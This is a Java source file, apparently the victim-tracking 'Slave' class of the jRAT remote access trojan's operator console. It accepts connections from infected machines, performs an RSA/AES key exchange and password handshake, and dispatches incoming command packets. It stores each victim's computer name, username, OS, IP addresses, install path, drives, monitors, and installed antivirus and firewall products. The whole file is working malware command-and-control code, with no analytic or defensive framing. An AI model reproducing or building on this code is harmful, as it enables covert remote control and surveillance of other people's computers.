package su.jrat.client;

import java.awt.TrayIcon;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

import javax.crypto.BadPaddingException;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.swing.ImageIcon;

import su.jrat.client.crypto.GlobalKeyPair;
import su.jrat.client.exceptions.CloseException;
import su.jrat.client.extensions.PluginEventHandler;
import su.jrat.client.ip2c.Country;
import su.jrat.client.net.ConnectionHandler;
import su.jrat.client.net.PortListener;
import su.jrat.client.packets.incoming.IncomingPackets;
import su.jrat.client.packets.outgoing.AbstractOutgoingPacket;
import su.jrat.client.packets.outgoing.Packet0Ping;
import su.jrat.client.packets.outgoing.Packet99Encryption;
import su.jrat.client.settings.Settings;
import su.jrat.client.ui.frames.Frame;
import su.jrat.client.ui.panels.PanelMainLog;
import su.jrat.client.utils.FlagUtils;
import su.jrat.client.utils.TrayIconUtils;
import su.jrat.client.utils.Utils;
import su.jrat.common.OperatingSystem;
import su.jrat.common.Version;
import su.jrat.common.codec.Hex;
import su.jrat.common.crypto.Crypto;
import su.jrat.common.crypto.KeyExchanger;
import su.jrat.common.hash.Sha1;

import com.redpois0n.graphs.monitors.RemoteMonitor;

@SuppressWarnings("unused")
public class Slave implements Runnable {

	public static boolean encryption = true;

	private Socket socket;

	private DataInputStream dis;
	private DataOutputStream dos;
	private OutputStream outputStream;
	private InputStream inputStream;
	private BufferedReader br;
	private PrintWriter pw;

	private PortListener connection;

	private final List<String> queue = new ArrayList<String>();
	private Drive[] drives;
	private RemoteMonitor[] monitors;
	private Locale[] locales;
	private Antivirus[] antiviruses;
	private Firewall[] firewalls;
	
	private PublicKey rsaKey;
	private byte[] key;

	private String computername = "";
	private String ip = "";
	private String host = "";
	private String serverid = "";
	private String osname = "";
	private String username = "";
	private String serverpath = "";
	private String javaver = "";
	private String javapath = "";
	private String localip = "";
	private String version = "";
	private String installdate = "";
	private String renamedid = "";
	private String country = "Unknown";
	private String longcountry;
	private String language = "";
	private String displaylanguage = "";

	private boolean responded = false;
	private boolean verified = false;
	private boolean checked = false;
	private boolean selected = false;
	private boolean lock = false;

	private int ping = 0;
	private int status = 5;

	private int ram = 0;
	private short processors;

	public long pingms = 0;
	private long sent = 0;
	private long received = 0;
	private final long uniqueId = (new Random()).nextLong();

	private ImageIcon thumbnail = null;

	public Slave(PortListener connection, Socket socket) {
		this.connection = connection;
		this.socket = socket;
		this.ip = socket.getInetAddress().getHostAddress() + " / " + socket.getPort();
		new Thread(this).start();
	}

	public Slave(String ip) {
		this.ip = ip;
	}
	
	public byte[] getKey() {
		return key;
	}

	public void run() {
		try {
			socket.setSoTimeout(connection.getTimeout());
			socket.setTrafficClass(24);

			this.host = socket.getInetAddress().getHostName();

			if (Settings.getGlobal().getBoolean("geoip")) {
				Country country = FlagUtils.getCountry(this);

				if (country != null) {
					this.country = country.get2cStr();

					if (this.country.equalsIgnoreCase("ZZ")) {
						this.country = "?";
					}
				} else {
					this.country = "?";
				}
			} else {
				this.country = "?";
			}

			PanelMainLog.instance.addEntry("Connect", this, "");

			this.inputStream = socket.getInputStream();
			this.outputStream = socket.getOutputStream();

			this.dis = new DataInputStream(inputStream);
			this.dos = new DataOutputStream(outputStream);
			
			KeyExchanger exchanger = new KeyExchanger(dis, dos, GlobalKeyPair.getKeyPair());
			exchanger.writePublicKey();
			exchanger.readRemotePublicKey();
			rsaKey = exchanger.getRemoteKey();
			
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(128);
            SecretKey secretKey = keyGen.generateKey();

            key = secretKey.getEncoded();
            byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
            dos.writeInt(encryptedKey.length);
            dos.write(encryptedKey);
			
			if (Main.debug) {
				Main.debug("Encryption key: " + Hex.encode(key));
			}

			this.outputStream.write(encryption ? 1 : 0);

			while (true) {
				byte header = readByte();

				if (header == 1) {
					Sha1 sha = new Sha1();
					
					String data = connection.getPass();

					byte[] localHash = sha.hash(data);
					byte[] remoteHash = new byte[20];

					dis.readFully(remoteHash);					

					if (Arrays.equals(localHash, remoteHash)) {
						setVerified(true);
						ConnectionHandler.addSlave(this);
						continue;
					}
				}

				if (!isVerified()) {
					PanelMainLog.instance.addEntry("Warning", this, "Failed verifying password, not valid handshake");
					this.closeSocket(new CloseException("Failed verifying password, not valid handshake"));
				}

				if (header == 0) {
					long ping = System.currentTimeMillis() - pingms;
					this.ping = (int) ping;
					Frame.mainModel.setValueAt(ping + " ms", Utils.getRow(3, getIP()), 4);
					continue;
				}

				IncomingPackets.execute(header, this);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();

			PanelMainLog.instance.addEntry("Disconnect", this, message);

			if (ex instanceof BadPaddingException) {
				message += ", is the encryption key matching?";
			}

			try {
				ConnectionHandler.removeSlave(this, ex);
			} catch (Exception e) {
			}

			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
			PluginEventHandler.onDisconnect(this);
		}
	}

	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
		while (lock) {
			try {
				Thread.sleep(10L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}

		}
		try {
			packet.send(this, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void writeShort(short i) throws Exception {
		dos.writeShort(i);
	}

	public short readShort() throws Exception {
		return dis.readShort();
	}

	public byte readByte() throws Exception {
		return dis.readByte();
	}

	public void writeByte(int b) throws Exception {
		dos.writeByte(b);
	}

	public boolean readBoolean() throws Exception {
		return dis.readBoolean();
	}

	public void writeBoolean(boolean b) throws Exception {
		dos.writeBoolean(b);
	}

	public int readInt() throws Exception {
		return dis.readInt();
	}

	public void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}

	public long readLong() throws Exception {
		return dis.readLong();
	}

	public void writeLong(long l) throws Exception {
		dos.writeLong(l);
	}

	public void writeLine(Object obj) {
		writeLine(obj.toString());
	}

	public void writeLine(String s) {
		try {
			String enc = Crypto.encrypt(s, getKey());

			if (enc.contains("\n")) {
				enc = "-h " + Hex.encode(s);
			} else if (s.startsWith("-c ")) {
				enc = s;
			} else if (!encryption) {
				enc = "-c " + s;
			}

			// dos.writeUTF(enc);
			dos.writeShort(enc.length());
			dos.writeChars(enc);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public String readLine() throws Exception {
		// String s = dis.readUTF();
		short len = dis.readShort();

		StringBuilder builder = new StringBuilder();
		for (int i = 0; i < len; i++) {
			builder.append(dis.readChar());
		}

		String s = builder.toString();

		if (s.startsWith("-h ")) {
			s = Hex.decode(s.substring(3, s.length()));
		} else if (s.startsWith("-c ")) {
			s = s.substring(3, s.length());
		} else {
			try {
				s = Crypto.decrypt(s, getKey());
			} catch (Exception e) {
				e.printStackTrace();
				s = null;
			}
		}

		return s;
	}

	@Override
	public boolean equals(Object o) {
		if (o instanceof Slave) {
			return ((Slave) o).getIP().equals(getIP());
		} else {
			return false;
		}
	}

	public OperatingSystem getOS() {
		String os = this.getOperatingSystem().toLowerCase();
		return OperatingSystem.getOperatingSystem(os);
	}

	public String getFileSeparator() {
		if (getOS() == OperatingSystem.WINDOWS) {
			return "\\";
		} else {
			return "/";
		}
	}

	public String getRawIP() {
		return getIP().split(" / ")[0];
	}

	public String getPort() {
		return getIP().split(" / ")[1];
	}

	public static boolean shouldFix(String i) {
		return i.contains(" / ");
	}

	public static String fix(String i) {
		return i.split(" / ")[0];
	}

	public String getCountry() {
		return country.toUpperCase();
	}

	public ImageIcon getFlag() {
		return FlagUtils.getFlag(country);
	}

	public boolean isUpToDate() {
		return getVersion().equals(Version.getVersion());
	}

	public Socket getSocket() {
		return socket;
	}

	public void setSocket(Socket socket) {
		this.socket = socket;
	}

	public DataInputStream getDataInputStream() {
		return dis;
	}

	public DataOutputStream getDataOutputStream() {
		return dos;
	}

	public OutputStream getOutputStream() {
		return outputStream;
	}

	public InputStream getInputStream() {
		return inputStream;
	}

	public PortListener getConnection() {
		return connection;
	}

	public void setConnection(PortListener connection) {
		this.connection = connection;
	}

	public List<String> getQueue() {
		return queue;
	}

	public Drive[] getDrives() {
		return drives;
	}

	public void setDrives(Drive[] drives) {
		this.drives = drives;
	}

	public RemoteMonitor[] getMonitors() {
		return monitors;
	}

	public void setMonitors(RemoteMonitor[] monitors) {
		this.monitors = monitors;
	}

	public String getComputerName() {
		return computername;
	}

	public void setComputerName(String name) {
		this.computername = name;
	}

	public String getIP() {
		return ip;
	}

	public void setIP(String ip) {
		this.ip = ip;
	}

	public String getHost() {
		return host;
	}

	public void setHost(String host) {
		this.host = host;
	}

	public String getServerID() {
		return serverid;
	}

	public void setServerID(String serverid) {
		this.serverid = serverid;
	}

	public String getOperatingSystem() {
		return osname;
	}

	public void setOperatingSystem(String osname) {
		this.osname = osname;
	}

	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public String getServerPath() {
		return serverpath;
	}

	public void setServerPath(String serverpath) {
		this.serverpath = serverpath;
	}

	public String getJavaVersion() {
		return javaver;
	}

	public void setJavaVersion(String javaver) {
		this.javaver = javaver;
	}

	public String getJavaPath() {
		return javapath;
	}

	public void setJavaPath(String javapath) {
		this.javapath = javapath;
	}

	public String getLocalIP() {
		return localip;
	}

	public void setLocalIP(String localip) {
		this.localip = localip;
	}

	public String getVersion() {
		return version;
	}

	public void setVersion(String version) {
		this.version = version;
	}

	public String getInstallDate() {
		return installdate;
	}

	public void setInstallDate(String date) {
		this.installdate = date;
	}

	public String getRenamedID() {
		return renamedid;
	}

	public void setRenamedID(String renamedid) {
		this.renamedid = renamedid;
	}

	public void setCountry(String country) {
		this.country = country;
	}

	public String getLongCountry() {
		return longcountry;
	}

	public void setLongCountry(String longcountry) {
		this.longcountry = longcountry;
	}

	public boolean hasResponded() {
		return responded;
	}

	public void setResponded(boolean responded) {
		this.responded = responded;
	}

	public boolean isVerified() {
		return verified;
	}

	public void setVerified(boolean verified) {
		this.verified = verified;
	}

	public boolean isChecked() {
		return checked;
	}

	public void setChecked(boolean checked) {
		this.checked = checked;
	}

	public boolean isSelected() {
		return selected;
	}

	public void setSelected(boolean selected) {
		this.selected = selected;
	}

	public int getPing() {
		return ping;
	}

	public void setPing(int ping) {
		this.ping = ping;
	}

	public int getStatus() {
		return status;
	}

	public void setStatus(int status) {
		this.status = status;
	}

	public short getProcessors() {
		return processors;
	}

	public void setProcessors(short processors) {
		this.processors = processors;
	}

	public int getRam() {
		return ram;
	}

	public void setRam(int ram2) {
		this.ram = ram2;
	}

	public long getSent() {
		return sent;
	}

	public void setSent(long sent) {
		this.sent = sent;
	}

	public long getReceived() {
		return received;
	}

	public void setReceived(long received) {
		this.received = received;
	}

	public ImageIcon getThumbnail() {
		return thumbnail;
	}

	public void setThumbnail(ImageIcon thumbnail) {
		this.thumbnail = thumbnail;
	}

	public void closeSocket(CloseException ex) {
		try {
			socket.close();
			ex.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public Locale[] getLocales() {
		return locales;
	}

	public void setLocales(Locale[] locales) {
		this.locales = locales;
	}

	public String getDisplayLanguage() {
		return displaylanguage;
	}

	public void setDisplayLanguage(String language) {
		this.displaylanguage = language;
	}

	public String getLanguage() {
		return language.toUpperCase();
	}

	public void setLanguage(String language) {
		this.language = language;
	}

	public void ping() throws Exception {
		addToSendQueue(new Packet0Ping());
		pingms = System.currentTimeMillis();
	}

	public void lock() {
		lock = !lock;
	}

	public static final synchronized void toggleEncryption(boolean b) {
		encryption = b;

		for (Slave slave : Main.connections) {
			slave.addToSendQueue(new Packet99Encryption(b));
		}

	}

	public boolean isLocked() {
		return lock;
	}

	public long getUniqueId() {
		return uniqueId;
	}

	public void setAntiviruses(Antivirus[] antiviruses) {
		this.antiviruses = antiviruses;
	}

	public Antivirus[] getAntiviruses() {
		return this.antiviruses;
	}

	public void setFirewalls(Firewall[] firewalls) {
		this.firewalls = firewalls;
	}

	public Firewall[] getFirewalls() {
		return firewalls;
	}
}